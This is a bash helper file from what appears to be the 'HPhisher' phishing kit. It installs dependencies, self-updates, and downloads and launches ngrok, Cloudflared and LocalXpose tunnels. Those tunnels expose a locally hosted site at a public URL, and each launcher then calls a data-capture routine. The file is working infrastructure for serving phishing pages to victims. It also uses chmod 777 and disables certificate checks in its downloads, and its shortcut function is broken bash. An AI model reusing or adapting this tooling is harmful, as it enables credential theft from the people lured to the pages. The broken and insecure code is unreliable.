##COLOUR VARIABLES
#Text
RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"
CYAN="$(printf '\033[36m')"
WHITE="$(printf '\033[37m')"
BLACK="$(printf '\033[30m')"
NC='\033[0m' #Reset colour
#Background
REDBG="$(printf '\033[41m')"
GREENBG="$(printf '\033[42m')"
ORANGEBG="$(printf '\033[43m')"
BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"
CYANBG="$(printf '\033[46m')"
WHITEBG="$(printf '\033[47m')"
BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')" #Reset background

#Directories
pro_dir=$(pwd) #project directory
server_dir="${pro_dir}/.server" #server directory
sites_dir="${pro_dir}/.sites" #sites directory

#Normal Banner
banner(){
	echo " "
	echo -e "${GREEN} ███╗    ███╗${BLUE}██████╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔══██║ ${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${GREEN} ███████████║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${GREEN} ╚══╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}        ${NC} "
}
# Credits banner
cbanner(){
  echo " "
	echo -e "${GREEN} ███╗    ███╗${BLUE}██████╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔══██║ ${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║  ██║██╗  ██╗██╗███████╗██╗  ██╗███████╗██████╗${NC}"
	echo -e "${GREEN} ███████████║${BLUE}██████╔╝██║  ██║██║██╔════╝██║  ██║██╔════╝██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██╔═══╝ ███████║██║███████╗███████║█████╗  ██████╔╝${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██╔══██║██║╚════██║██╔══██║██╔══╝  ██╔══██╗${NC}"
	echo -e "${GREEN} ███║    ███║${BLUE}██║     ██║  ██║██║███████║██║  ██║███████╗██║  ██║${NC}"
	echo -e "${GREEN} ╚══╝    ╚══╝${BLUE}╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝${NC}"
	echo -e "${CYAN}                                                  By - ${RED}Alygnt${NC}"
	echo -e "${CYAN}        ${NC} "
	echo -e "${RED}                           Version 1.0 ${NC}"
	echo -e "${CYAN}        ${NC} "
}
#Small Banner
sbanner(){
	echo " "
	echo -e "${GREEN} ▒█░░▒█${BLUE} ▒█▀▀█ ${NC}"
	echo -e "${GREEN} ▒█▒░▒█${BLUE} ▒█▄▄█ █░░█ ░▀░ █▀▀ █░░█ █▀▀ █▀▀█${NC}"
	echo -e "${GREEN} ▒█████${BLUE} ▒█░░░ █▀▀█ ▀█▀ ▀▀█ █▀▀█ █▀▀ █▄▄▀${NC}"
	echo -e "${GREEN} ▒█░░░█${BLUE} ▒█░░░ ▀░░▀ ▀▀▀ ▀▀▀ ▀░░▀ ▀▀▀ ▀░░▀${NC}"
	echo -e "${CYAN}        ${NC} "
}

## Directories
directories(){
if [[ ! -d ".server" ]]; then
        mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
        rm -rf ".server/www"
        mkdir -p ".server/www"
else
        mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
        rm -rf ".cld.log"
fi
}

#Dependencies
dependencies() {
        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
                        echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

        if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Packages already installed."
        else
                pkgs=(php curl wget unzip)
                for pkg in "${pkgs[@]}"; do
                        type -p "$pkg" &>/dev/null || {
                                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
                                if [[ `command -v pkg` ]]; then
                                        pkg install "$pkg" -y
                                elif [[ `command -v apt` ]]; then
                                        apt install "$pkg" -y
                                elif [[ `command -v apt-get` ]]; then
                                        apt-get install "$pkg" -y
                                elif [[ `command -v pacman` ]]; then
                                        sudo pacman -S "$pkg" --noconfirm
                                elif [[ `command -v dnf` ]]; then
                                        sudo dnf -y install "$pkg"
                                else
                                        echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
                                        { reset_color; exit 1; }
                                fi
                        }
                done
        fi

}

## Reset terminal colors
reset_color() {
        tput sgr0   # reset attributes
        tput op     # reset color
    return
}

## Exit message
msg_exit() {
        { clear; banner; echo; }
        echo -e "${GREENBG}${BLACK} Thank you for using this tool. Have a good day.${RESETBG}\n"
        { reset_color; exit 0; }
}

## Kill already running process
kill_pid() {
        if [[ `pidof php` ]]; then
                killall php > /dev/null 2>&1
        fi
        if [[ `pidof ngrok` ]]; then
                killall ngrok > /dev/null 2>&1
        fi
        if [[ `pidof cloudflared` ]]; then
                killall cloudflared > /dev/null 2>&1
        fi
}

#check whether execute permission is granted
xpermission(){
	if [[ -x "hphisher.sh" ]];then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	else
	        chmod 777 hphisher.sh
	        echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Execute Permission Granted!!"
	fi
}

#check for updates
check_update() {
	rm -rf version.txt
	rm -rf core/update/tmp/version.txt

	wget --no-check-certificate https://raw.githubusercontent.com/Alygnt/HPhisher/main/core/update/version.txt > /dev/null 2>&1
	mv version.txt core/update/tmp

	current_ver=$( cat core/update/version.txt )
	lat_ver=$( cat core/update/tmp/version.txt )
	if [ $current_ver == $lat_ver ]; then
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Your up to date!! ${NC} "
		{ sleep 3; clear; mainmenu; }
	else
		echo " "
		echo "${GREEN} Current version = ${YELLOW} $current_ver "
		echo "${GREEN} Latest version = ${YELLOW} $lat_ver "
		read -p "${GREEN}[${WHITE}#${GREEN}]${GREEN} Update found!! (Latest Version ${lat_ver} ) Do you want to update? (y/n) :"  ureply
		case $ureply in
			Y | y)
				update;;
			N | n)
				{ clear;  mainmenu; };;

		esac
	fi
}

update() {
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} UPDATING ${NC}"
	mkdir $HOME/hphisher
	if [ -e .server/ngrok ]; then
		mv .server/ngrok $HOME/hphisher
	fi
	if [ -e .server/cloudflared ]; then
        	mv .server/cloudflared $HOME/hphisher
	fi

	cd ..
	rm -rf HPhisher
	echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} REINSTALLING THE TOOL ${NC} "
	git clone https://github.com/Alygnt/HPhisher

	if [ -d HPhisher ]; then
		cd HPhisher
	        mv $HOME/hphisher/ngrok .server
	        mv $HOME/hphisher/cloudflared .server
	        rm -rf $HOME/hphisher
	        credits_banner
		echo " "
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} SUCCESSFULLY UPDATED!! ( Version: ${lat_ver} ) ${NC} "
	        sleep 0.3
		echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Now running the tool!! ${NC} "
	        sleep 2
	        bash hphisher.sh
		echo  " "
	else
		echo -e "\n${GREEN}[${WHITE}!${GREEN}]${RED} SORRY, ERROR OCCURED!! TRY REINSTALLING MANUALLY!! ${NC} "
	fi

}


## Shortcut
shortut_check() {
	if [[ -s "/bin/hphisher" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Shortcut is active."
	else
		shortcut
	fi
}
shortcut() {
	read -p "${RED}[${WHITE}-${RED}]${GREEN} Do you want to setup shortcut (Y/n) : ${BLUE}" shortcut_reply
		case $shortcut_reply in
		Y | y)
			shortcut_setup;;
		N | n)
			echo "";;
		*)
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${RED} Invaild option try again."
			shortcut_check;;
		esac
}
shortcut_setup() {
	rm -rf /bin/hphisher
	shortcutcmd = "pro_dir = ${pro_dir}"
	"if [[ -d "${pro_dir}" ]]; then
		bash ${pro_dir}/hphisher.sh
	else
		echo -e "\n [-] HPhisher directory not found. It maybe moved or deleted try downloading HPhisher again. "
	fi
	"
	echo ${shortcutcmd} >> hphisher
	chmod 777 hphisher
	mv hphisher /bin
}

## Install ngrok
install_ngrok() {
	if [[ -e ".server/ngrok" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Ngrok already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing ngrok..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok'
		else
			download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok'
		fi
	fi
}

##Ngrok token auth
ngrok_token_check(){
        if [ -s "${HOME}/.ngrok2/ngrok.yml" ]; then
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok Authtoken setup is already done."
        else
                echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Setting up authtoken"
                ngrok_token_setup
        fi
}

ngrok_token_setup(){
        if [[ -d "${HOME}/.ngrok2/" ]]; then
               echo -e "\n${GREEN}[${WHITE}#${GREEN}]${GREEN} Ngrok2 directory exists!!"
        else
               mkdir $HOME/.ngrok2
               echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Created Ngrok2 directory "
        fi

        if [[ -s "${HOME}/.ngrok2/ngrok.yml" ]]; then
               rm -rf ${HOME}/.ngrok2/ngrok.yml
	       echo -e "\n"
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               authline="authtoken : ${ntoken}"
               echo "$authline" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        else
               read -p "${RED}[${WHITE}-${RED}]${GREEN} Enter your authtoken :" ntoken
               echo "authtoken : ${ntoken}" >> ngrok.yml
               mv ngrok.yml ${HOME}/.ngrok2/
        fi

}

## Start ngrok
start_ngrok() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
        ngrok_token_check
    if [[ `command -v termux-chroot` ]]; then
        sleep 2 && termux-chroot ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/ngrok http "$HOST":"$PORT" > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }
        ngrok_url=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[-0-9a-z]*\.ngrok.io")
        echo -e "\n ${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN} $ngrok_url"
        capture_data_check
}

## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
		else
			download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
		fi
	fi
}

## Start Cloudflared
start_cloudflared() {
        rm .cld.log > /dev/null 2>&1 &
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        { sleep 1; setup_site; }
        echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
                sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

        { sleep 8; clear; banner; }

        cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
        echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}$cldflr_link"
        capture_data_check
}

## Install LocalXpose
install_localxpose() {
	if [[ -e ".server/loclx" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} LocalXpose already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing LocalXpose..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm.zip' 'loclx'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-arm64.zip' 'loclx'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-amd64.zip' 'loclx'
		else
			download 'https://api.localxpose.io/api/v2/downloads/loclx-linux-386.zip' 'loclx'
		fi
	fi
}

auth_localxpose() {
	./.server/loclx -help > /dev/null 2>&1 &
	sleep 1
	[ -d ".localxpose" ] && auth_f=".localxpose/.access" || auth_f="$HOME/.localxpose/.access"

	[ "$(./.server/loclx account status | grep Error)" ] && {
		echo -e "\n\n${RED}[${WHITE}!${RED}]${GREEN} Create an account on ${ORANGE}localxpose.io${GREEN} & copy the token\n"
		sleep 3
		read -p "${RED}[${WHITE}-${RED}]${ORANGE} Loclx Token :${ORANGE} " loclx_token
		[[ $loclx_token == "" ]] && {
			echo -e "\n${RED}[${WHITE}!${RED}]${RED} You have to input Localxpose Token." ; sleep 2 ; tunnel_menu
		} || {
			echo -n "$loclx_token" > $auth_f 2> /dev/null
		}
	}
}

## Start LocalXpose
start_loclx() {
	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; auth_localxpose; }
	echo -e "\n"
	read -n1 -p "${RED}[${WHITE}-${RED}]${ORANGE} Change Loclx Server Region? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]:${ORANGE} " opinion
	[[ ${opinion,,} == "y" ]] && loclx_region="eu" || loclx_region="us"
	echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching LocalXpose..."

	if [[ `command -v termux-chroot` ]]; then
		sleep 1 && termux-chroot ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	else
		sleep 1 && ./.server/loclx tunnel --raw-mode http --region ${loclx_region} --https-redirect -t "$HOST":"$PORT" > .server/.loclx 2>&1 &
	fi

	{ sleep 12; clear; banner; }
	loclx_url=$(cat .server/.loclx | grep -o '[0-9a-zA-Z.]*.loclx.io') #DONE :)
	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} URL : ${GREEN}http://$loclx_url"
	capture_data_check
}

# Download Binaries
download() {
	url="$1"
	output="$2"
	file=`basename $url`
	if [[ -e "$file" || -e "$output" ]]; then
		rm -rf "$file" "$output"
	fi
	curl --silent --insecure --fail --retry-connrefused \
		--retry 3 --retry-delay 2 --location --output "${file}" "${url}"

	if [[ -e "$file" ]]; then
		if [[ ${file#*.} == "zip" ]]; then
			unzip -qq $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		elif [[ ${file#*.} == "tgz" ]]; then
			tar -zxf $file > /dev/null 2>&1
			mv -f $output .server/$output > /dev/null 2>&1
		else
			mv -f $file .server/$output > /dev/null 2>&1
		fi
		chmod +x .server/$output > /dev/null 2>&1
		rm -rf "$file"
	else
		echo -e "\n${RED}[${WHITE}!${RED}]${RED} Error occured while downloading ${output}."
		{ reset_color; exit 1; }
	fi
}

## Start localhost
start_localhost() {
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
        setup_site
        { sleep 1; clear; banner; }
        echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Successfully Hosted at : ${GREEN}${CYAN}http://$HOST:$PORT ${GREEN}"
        capture_data_check
}
